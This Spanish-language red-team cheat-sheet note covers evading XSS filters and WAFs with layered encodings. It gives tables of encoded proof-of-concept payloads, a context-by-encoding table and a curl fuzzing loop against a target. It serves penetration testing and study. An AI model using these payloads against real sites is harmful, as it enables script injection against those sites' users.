---
aliases:
  - Double URL Encoding
tags:
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Scripting (XSS)]]"
---
# XSS - Evasión de Filtros XSS y WAF mediante Codificaciones Múltiples

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `%3Cscript%3Ealert(1)%3C%2Fscript%3E` | URL encoding standard | WAF busca `<script>` literal en query string. |
| `%253Cimg%20src%3Dx%20onerror%3Dalert(1)%253E` | Double URL encoding (`%25` = `%`) | Proxy decode una vez, app decode otra. |
| `<a href="javascript&#58;alert(1)">` | HTML entity `&#58;` (`:`) | Atributo `href` decode entities pre-URL-parse. |
| `<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">` | HTML entities encode del scheme entero | Filtro busca string literal `javascript`. |
| `<script>\x61\x6c\x65\x72\x74(1)</script>` | Hex escapes en JS = `alert(1)` | Filtro keyword `alert` pero deja `\x`. |
| `<script>prompt(1)</script>` | Unicode escapes en JS = `prompt(1)` | Filtro keyword JS. |
| `<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>` | Data URI base64 con HTML+JS | Filtro busca `<script>` plano. |
| `%6A%61%76%61%73%63%72%69%70%74%3A%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(1)` | Mixed encoding (URL → HTML entity) | WAFs con chains de decoders. |
| `<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>` | `String.fromCharCode` → `alert(1)` | Filtro keyword `alert` strict. |
| `<script>eval(atob('YWxlcnQoMSk='))</script>` | Base64 + atob + eval | Filtro keyword. |
| `<script>(()=>{const a=String.fromCharCode;eval(a(97)+a(108)+a(101)+a(114)+a(116)+'(1)')})()</script>` | Construcción dinámica de `alert(1)` | WAFs con regex complejo. |
| `<svg/onload="window['al'+'ert'](1)">` | String concat ofusca `alert` | Filtro keyword exact. |
| `<svg/onload="self['ale'+'rt'](1)">` | `self`/`window`/`top`/`globalThis` intercambiables | Filtro busca `window.alert`. |
^xss-waf

### Encoding por contexto

| **Contexto** | **Encoding que funciona** | **Encoding que NO** |
|:---:|:---:|:---:|
| Query string (URL) | URL `%xx`, doble URL `%25xx` | HTML entities. |
| Atributo HTML (`href`, `src`, `onerror`) | HTML entities `&#xx;`, URL `%xx` (en URL attrs) | `\x` JS hex (no funciona en HTML body). |
| Bloque `<script>` | JS `\x`, `\u`, `String.fromCharCode`, `atob+eval` | HTML entities (no decoded en JS). |
| Atributo event handler (`onclick="..."`) | HTML entities + JS hex (decoded en orden) | Solo URL encoding. |
| CSS context | CSS escape `\6a `, hex | HTML entities. |
| JSON response | Unicode `\u00XX` | HTML entities. |
^xss-waf-context

### Workflow

```bash
# 1. Fuzzing granular — identificar qué char dispara el bloqueo
for c in '<' '>' '"' "'" '(' ')' '/' '=' 'script' 'alert' 'svg' 'onerror'; do
  RES=$(curl -s -o /dev/null -w '%{http_code}' "https://target/?q=$c")
  echo "$c → $RES"
done

# 2. Encoding del char/keyword bloqueado, dejar resto plano
# Si solo `alert` bloqueado:
PAYLOAD='<svg onload="window[`al`+`ert`](1)">'

# 3. Chains de encoding contra WAFs con múltiples decoders
# URL → HTML entity → JS hex (3 capas)
echo '<svg onload=alert(1)>' | jq -sRr @uri  # URL once
echo -n '<svg onload=alert(1)>' | jq -sRr @uri | jq -sRr @uri  # URL twice

# 4. Tools auto
# - hackvertor (Burp BApp) — chains de encoding
# - dalfox — fuzzer XSS con WAF bypass built-in
```

---

## Overview

WAFs y sanitizers usan regex/blacklists sobre el string crudo. Browsers/parsers decodifican en orden: URL → HTML entity → JS escape → CSS escape. Cada capa de decoding es una oportunidad de evasión.

**Reglas clave:**
1. Identificá EN QUÉ contexto aterriza el payload (URL? atributo? script body? CSS?).
2. Solo el encoding del contexto se aplica.
3. Combinar capas → "encoding chain" — válido cuando proxy + app + parser decodifican secuencial.

Doble URL encoding = caso clásico — proxy `%25` → `%` → app `%xx` → real char.

---
